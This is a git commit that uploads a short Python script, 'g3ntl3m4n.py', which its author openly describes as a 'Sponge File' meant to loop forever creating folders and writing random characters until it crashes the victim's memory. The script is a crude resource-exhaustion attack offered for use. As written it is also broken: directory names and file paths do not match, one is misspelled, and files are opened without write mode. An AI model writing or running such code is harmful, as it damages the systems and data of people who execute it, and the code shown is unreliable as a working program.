bbbfd039e5a811807b5d4fb76527471949de9089
Delwser <87214159+Delwser@users.noreply.github.com>
2024-04-08 11:53:22 -0300

    Add files via upload
    g3ntl3m4n.py is a code can create a folders and files, and into files, it write random caracters, but this a loop. it crash your memory ram. :)
    
    (Sponge File by DARK PARASITES)

---
+++ g3ntl3m4n.py
@@ -0,0 +1,27 @@
+import os 
+import random
+import string
+
+while True:
+    os.makedirs("DarkParasites" "a" , exist_ok=True)
+    with open(f"DarkParisites/bypass.txt") as arquivo:
+         for _ in range(90000):
+              arquivo.write(random.choice(string.ascii_letters + string.digits))
+
+    os.makedirs("Th3_g3ntl3m4n" "a" , exist_ok=True)
+    with open(f"Th3_g3ntl3m4n/t@nd3r@") as arquivo:
+         for _ in range(90000):
+              arquivo.write(random.choice(string.ascii_letters + string.digits))
+
+
+    os.makedirs("J0aninh@s" "a" , exist_ok=True)
+    with open(f"J0aninh@s/fsociety") as arquivo:
+         for _ in range(90000):
+              arquivo.write(random.choice(string.ascii_letters + string.digits))
+
+
+
+
+#Cria 3 pastas, e fica colando caracteres dentro de um txt, até travar a memória.
+    
+
